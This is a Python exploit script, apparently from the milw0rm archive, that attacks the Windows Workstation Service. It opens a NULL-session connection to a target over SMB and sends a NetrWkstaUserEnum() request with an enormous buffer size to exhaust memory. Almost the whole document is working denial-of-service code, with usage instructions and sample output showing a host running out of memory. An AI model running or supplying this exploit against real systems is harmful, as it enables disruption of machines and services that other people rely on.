#!/usr/bin/python
# MS Windows Workstation Service NetrWkstaUserEnum() 0day Memory Allocation Remote DoS Exploit
# Bug discovered by h07 <h07@interia.pl>
# Tested on:..
# - Windows XP SP2 Polish
# - Windows 2000 SP4 Polish + All Microsoft Security Bulletins
# Example:
#
# wks_dos.py 192.168.0.2 512
#
# [*] MS Windows NetrWkstaUserEnum() 0day Memory Allocation Remote DoS Exploit
# [*] Coded by h07 <h07@interia.pl>
# [*] Connecting to 192.168.0.2:445 (NULL Session)
# [+] Connected
# [+] The NETBIOS connection with the remote host timed out.
# [+] 192.168.0.2: Out of memory
# [+] Done
#
# NetrWkstaUserEnum(max_len = 1024 * 1024 * 512)
# Exploit --> NULL Session --> PIPE: browser --> NetrWkstaUserEnum() --> Windows XP
# svchost.exe memory usage: 512 MB
##

from impacket.structure import Structure
from impacket.nmb import NetBIOSTimeout
from impacket.dcerpc import transport
from impacket import uuid
from struct import pack
from string import atoi
from sys import argv
from sys import exit

print "\n[*] MS Windows NetrWkstaUserEnum() 0day Memory Allocation Remote DoS Exploit"
print "[*] Coded by h07 <h07@interia.pl>"

if(len(argv) < 3):
  print "[*] Usage: %s <host> <memory_size(MB)>" % (argv[0])
  print "[*] Sample: %s 192.168.0.1 512" % (argv[0])
  exit()

MB = 1024 * 1024
host = argv[1]
memory_size = MB * atoi(argv[2])
pipe = 'browser'
UUID = ('6bffd098-a112-3610-9833-46c3f87e345a', '1.0')

stringbinding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
stringbinding %= {'host':host, 'pipe':pipe}

def utf16(str):
   return str.encode('utf_16_le')

class B1(Structure):
   alignment = 4
   structure = (
       ('id', '<L=0x41414141'),
       ('max', '<L'),
       ('offset', '<L=0'),
       ('actual', '<L'),
       ('str', '%s'),
   )

class NetrWkstaUserEnum(Structure):
   alignment = 4
   opnum = 2
   structure = (
       ('server', ':', B1),
       ('info_level1', '<L=1'),
       ('info_level2', '<L=1'),
       ('referent_id1', '<L=0x42424242'),
       ('num_entries', '<L=0'),
       ('null_pointer', '<L=0'),
       ('max_len', '<L'),
       ('referent_id2', '<L=0x43434343'),
       ('enumeration_handle', '<L=0x00000000'),
   )

query = NetrWkstaUserEnum()
server = "%s\x00" % (host)
query['server'] = B1()
query['server']['id'] = 0x41414141
query['server']['actual'] = len(server)
query['server']['max'] = len(server)
query['server']['str'] = utf16(server)
query['max_len'] = memory_size

trans = transport.DCERPCTransportFactory(stringbinding)

print "[*] Connecting to %s:445 (NULL Session)" % (host)

try:
  trans.connect()

except Exception, err:
  print "[-] %s" % (err)
  exit()

print "[+] Connected"

dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin((UUID[0], UUID[1])))
dce.call(query.opnum, query)

try:
  raw = dce.recv()
  status = raw[-4:]

  if(status == pack("<L", 0x00000005)):
      print "[-] Return code: Access denied"
      exit()

  if(status == pack("<L", 0x00000008)):
      print "[-] Return code: Memory allocation error, out of memory"
      exit()

  if(status == pack("<L", 0x00000000)):
      print "[+] Return code: Success, memory allocated"

except NetBIOSTimeout, err:
  print "[+] %s" % (err)
  print "[+] %s: Out of memory" % (host)

print "[+] Done"

# EoF

# milw0rm.com [2006-12-25]
